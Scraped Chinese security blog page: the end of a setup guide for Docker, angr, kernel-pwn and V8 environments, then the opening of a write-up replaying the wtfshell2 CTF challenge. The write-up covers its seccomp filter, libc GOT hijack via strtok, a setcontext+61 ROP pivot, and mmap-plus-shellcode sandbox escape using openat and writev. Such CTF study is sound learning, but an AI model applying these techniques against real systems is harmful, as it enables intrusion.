<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br><span class="line">sudo service docker restart</span><br><span class="line">newgrp - docker</span><br></pre></td></tr></table></figure>
<p>docker-compose：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.5/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<ul>
<li>如果嫌这个太慢可以直接去 github 上下载：<a target="_blank" rel="noopener" href="https://github.com/docker/compose/releases/tag/v2.14.0">Release v2.14.0 · docker/compose (github.com)</a> </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>
<p><strong>angr 环境搭建</strong></p>
<p>为了不与 pwntools 库引起冲突，可以采用拉取 docker 镜像的方式进行使用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull angr/angr</span><br></pre></td></tr></table></figure>
<p>以下脚本可以方便我们运行 docker angr：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/zsh</span></span><br><span class="line">pwd=`pwd`</span><br><span class="line">script=$1</span><br><span class="line">docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr &quot;/home/angr/.virtualenvs/angr/bin/python&quot; &quot;/mnt/$script&quot; $2 $3</span><br></pre></td></tr></table></figure>
<p><strong>Kernel Pwn 环境搭建</strong></p>
<p>安装 qemu：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu  </span><br></pre></td></tr></table></figure>
<p>安装 busybox：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://busybox.net/downloads/busybox-1.23.2.tar.bz2</span><br></pre></td></tr></table></figure>
<ul>
<li>官方下载地址：<a target="_blank" rel="noopener" href="https://busybox.net/downloads/">https://busybox.net/downloads/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>在“Build static binary”处按“Y”选中（采用静态编译，为了不添加动态链接库）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<ul>
<li>编译出来的 <code>_install</code> 就是目标了（这里的报错可能比较多，在网上都可以找到）</li>
</ul>
<p>编译内核：</p>
<ul>
<li>内核下载地址：<a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/linux-kernel/">linux-kernel安装包下载_开源镜像站-阿里云 (aliyun.com)</a> </li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig </span><br><span class="line">make x86_64_defconfig</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>x86_64</code> 默认配置</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j4</span><br></pre></td></tr></table></figure>
<ul>
<li>bzImage：<code>arch/x86/boot/bzImage</code></li>
<li>vmlinux：源码所在的根目录下</li>
</ul>
<p><strong>V8 环境搭建</strong></p>
<p>安装 depot_tools 工具集：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br></pre></td></tr></table></figure>
<ul>
<li>将 <code>depot_tools</code> 加入你的 <code>PATH</code> 环境变量中</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/profile.d/yhellow.sh</span><br><span class="line">---------------------------------------</span><br><span class="line">export PATH=&quot;$PATH:/home/yhellow/Tools/depot_tools&quot;</span><br></pre></td></tr></table></figure>
<p>获取 V8 源码：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line">./build/install-build-deps.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>在 V8 的目录中安装依赖（时间较长）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient config https://webrtc.googlesource.com/src.git </span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/14/libc%20GOT%E5%8A%AB%E6%8C%81+%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/14/libc%20GOT%E5%8A%AB%E6%8C%81+%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" class="post-title-link" itemprop="url">libc GOT劫持+沙盒逃逸</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-12-14 02:00:34 / Modified: 02:04:38" itemprop="dateCreated datePublished" datetime="2022-12-14T02:00:34+08:00">2022-12-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>wtfshell2 复现</strong></p>
<p>这个挑战有两个 flag：</p>
<ul>
<li>1.第一个 flag 隐藏在虚拟文件系统（又名内存）内的“flag1”文件中，甚至无法被虚拟根目录读取，您的目标是 pwn 库并实现 RAA</li>
<li>2.第二个 flag 位于虚拟文件系统之外，这意味着您必须实现任意代码执行（实际上是 ORW，由于seccomp）才能获得 flag </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.36</span><span class="number">-0u</span>buntu3)</span> stable release version 2.36.\n</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wtfshell: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">14b</span>74f98df26b1325153b74f6d77440e0b761024, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[!] Could <span class="keyword">not</span> populate PLT: invalid syntax (unicorn.py, line <span class="number">110</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/\xe6\xa1\x8c\xe9\x9d\xa2/wtfshell/share/wtfshell&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">➜  share seccomp-tools dump ./wtfshell  </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0006</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A != close) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A != mmap) <span class="keyword">goto</span> <span class="number">0017</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000020</span>  A = prot <span class="meta"># mmap(addr, len, prot, flags, fd, pgoff)</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000007</span>  <span class="keyword">if</span> (A == <span class="number">0x7</span>) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000030</span>  A = fd <span class="meta"># mmap(addr, len, prot, flags, fd, pgoff)</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000b</span>  <span class="keyword">if</span> (A != munmap) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A != brk) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000027</span>  <span class="keyword">if</span> (A != getpid) <span class="keyword">goto</span> <span class="number">0026</span></span><br><span class="line"> <span class="number">0025</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0026</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0027</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000066</span>  <span class="keyword">if</span> (A != getuid) <span class="keyword">goto</span> <span class="number">0029</span></span><br><span class="line"> <span class="number">0028</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0029</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0030</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000068</span>  <span class="keyword">if</span> (A != getgid) <span class="keyword">goto</span> <span class="number">0032</span></span><br><span class="line"> <span class="number">0031</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0032</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0033</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000014</span>  <span class="keyword">if</span> (A != writev) <span class="keyword">goto</span> <span class="number">0038</span></span><br><span class="line"> <span class="number">0034</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># writev(fd, vec, vlen)</span></span><br><span class="line"> <span class="number">0035</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0037</span></span><br><span class="line"> <span class="number">0036</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0037</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0038</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0039</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0045</span></span><br><span class="line"> <span class="number">0040</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = error_code <span class="meta"># exit(error_code)</span></span><br><span class="line"> <span class="number">0041</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0043</span></span><br><span class="line"> <span class="number">0042</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0044</span></span><br><span class="line"> <span class="number">0043</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0044</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0045</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0046</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0052</span></span><br><span class="line"> <span class="number">0047</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = error_code # exit_group(error_code)</span><br><span class="line"> <span class="number">0048</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0050</span></span><br><span class="line"> <span class="number">0049</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0051</span></span><br><span class="line"> <span class="number">0050</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0051</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0052</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0053</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000127</span>  <span class="keyword">if</span> (A != preadv) <span class="keyword">goto</span> <span class="number">0057</span></span><br><span class="line"> <span class="number">0054</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># preadv(fd, vec, vlen, pos_l, pos_h)</span></span><br><span class="line"> <span class="number">0055</span>: <span class="number">0x25</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &lt;= <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0057</span></span><br><span class="line"> <span class="number">0056</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0057</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，但是没有 <code>open</code></li>
<li><code>read</code> 的 FD 必须为“0”</li>
<li><code>mmap</code> 的权限设置不能为“7”，FD 必须设置为“-1”</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先利用 wtfshell1 的思路完成 libc 泄露和 WAA</p>
<p>然后就需要劫持程序的执行流了，这里我最开始的想法是打 IO，但伪造 <code>_IO_FILE</code> 的过程很痛苦，之后看别人博客才想起可以劫持 libc GOT</p>
<ul>
<li>可以先用 IDA 分析出 libc 的 GOT 偏移地址</li>
<li>然后在 GDB 中进行调试</li>
</ul>
<p>对于选择的 libc GOT 是有条件的，它必须以某个存放数据的 chunk 为参数，方便我们把 ROP 链的地址放入 RDX 寄存器里（使用 <code>setcontext+61</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_max(gbuff, GBSIZE);</span><br><span class="line"><span class="keyword">char</span> *token = strtok(gbuff, delim);</span><br></pre></td></tr></table></figure>
<p>于是我们选择 <code>strtok</code> 的 libc GOT 为目标，选择它有两个原因：</p>
<ul>
<li>以存放数据的 <code>gbuff</code> 为参数</li>
<li>如果不修改它的话，它会破坏我们输入的 ROP 链</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:<span class="number">00000000001F</span>6040 D0 <span class="number">80</span> <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_1F6040 dq offset <span class="built_in">strspn</span>             ; DATA XREF: j_strspn+<span class="number">4</span>↑r</span><br></pre></td></tr></table></figure>
<p>我们断点到程序执行 <code>strtok</code> 时，看看此时寄存器的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x55e7138db779</span>    call   strtok@plt                &lt;strtok@plt&gt;</span><br><span class="line">        s: <span class="number">0x55e7143e1d00</span> ◂— <span class="number">0x96dba0002e667477</span> <span class="comment">/* &#x27;wtf.&#x27; */</span></span><br><span class="line">        delim: <span class="number">0x55e7138dc028</span> ◂— <span class="number">0x213f2c2e</span> <span class="comment">/* &#x27;.,?!&#x27; */</span></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line">*RDX  <span class="number">0x3b</span></span><br><span class="line">*RDI  <span class="number">0x55e7143e1d00</span> ◂— <span class="number">0x96dba0002e667477</span> <span class="comment">/* &#x27;wtf.&#x27; */</span></span><br><span class="line">*RSI  <span class="number">0x55e7138dc028</span> ◂— <span class="number">0x213f2c2e</span> <span class="comment">/* &#x27;.,?!&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我们需要一个 gadget 来把 RDI 的堆地址转移到 RDX 中，并且可以继续控制执行流</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x000000000008c225</span>: mov rdx, qword ptr [rdi + <span class="number">8</span>]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span><br></pre></td></tr></table></figure>
<ul>
<li>这个 gadget 是从别人的 exp 上拿的，我自己习惯于找 <code>mov rdx</code> 和 <code>call qword ptr [rdx + n]</code> （没有找到）</li>
</ul>
<p>然后就要思考如何绕过 sandbox 了：</p>
<ul>
<li>没有 <code>open</code> 并且要求 <code>read</code> 的“FD”为“0”，这里如果用 ORW 链就很难完成，但是用 shellcode 就简单多了</li>
<li>不过程序 ban 了 <code>mprocess</code>，我们的 shellcode 没有权限</li>
</ul>
<p>后来发现 <code>mmap</code> 的 <code>prot</code> 如果为“6”的话，申请出来的空间是有权限的，为此我还查了一下 kernel 源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_READ	0x01</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_WRITE	0x02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_EXEC	0x04</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：Linux shell 的权限安排刚好是反过来的，坑了我一手</li>
</ul>
<p>于是接下来操作就比较套路了：</p>
<ul>
<li>利用 <code>setcontext+61</code> 完成栈迁移并执行一次 <code>read</code></li>
<li>在合适的地方写上一个 ORW，并执行 <code>mmap</code> 和另一个 <code>read</code>，并控制执行流到 <code>mmap</code> 出来的地址</li>
<li>在这个地址上写入 shellcode</li>
</ul>
<p>编写 shellcode：</p>
<ul>
<li>找到 <code>open</code> 的替代品：<code>preadv-295</code>（<code>openat-295</code>），不过第一个参数必须大于“2”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span>  dirfd , <span class="keyword">const</span> <span class="keyword">char</span> * pathname , <span class="keyword">int</span>  flags , ... )</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>pathname</code> 是绝对路径，则 <code>dirfd</code> 参数没用，不会受到沙盒的影响</li>
<li>找到 <code>write</code> 的替代品：<code>writev</code>，不过第一个参数必须为“1”，并且需要传入一个结构体（需要完成对应的伪造）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">writev</span><span class="params">(<span class="keyword">int</span> filedes, <span class="keyword">const</span> struct iovec *iov, <span class="keyword">int</span> iovcnt)</span></span>;</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *iov_base; <span class="comment">//starting address of buffer</span></span><br><span class="line">    <span class="keyword">size_t</span> iov_len; <span class="comment">//size of buffer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
